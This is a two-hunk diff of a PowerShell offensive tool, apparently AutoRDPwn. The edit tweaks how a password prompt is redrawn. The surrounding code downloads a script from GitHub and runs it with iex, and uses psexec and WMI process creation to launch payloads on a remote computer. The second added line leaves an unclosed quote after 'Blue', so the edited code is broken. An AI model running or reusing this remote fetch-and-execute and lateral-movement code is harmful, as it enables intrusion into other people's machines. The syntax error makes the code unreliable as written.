@@ -235,8 +235,8 @@ if($Language -in 'Spanish') {
 	Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host  
-	Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
+	Write-Host "********" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1" -UseBasicParsing | iex
 	if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe "$Pwn1" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe "$Pwn2" -nobanner -accepteula
@@ -274,8 +274,8 @@ if($Language -in 'Spanish') {
 	Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-	if(!$credential) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host  
-	Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$credential) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
+	Write-Host "********" } ; $Host.UI.RawUI.ForegroundColor = 'Blue
 	if(!$user) { Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn1 2>&1> $null
 	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }
 	Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
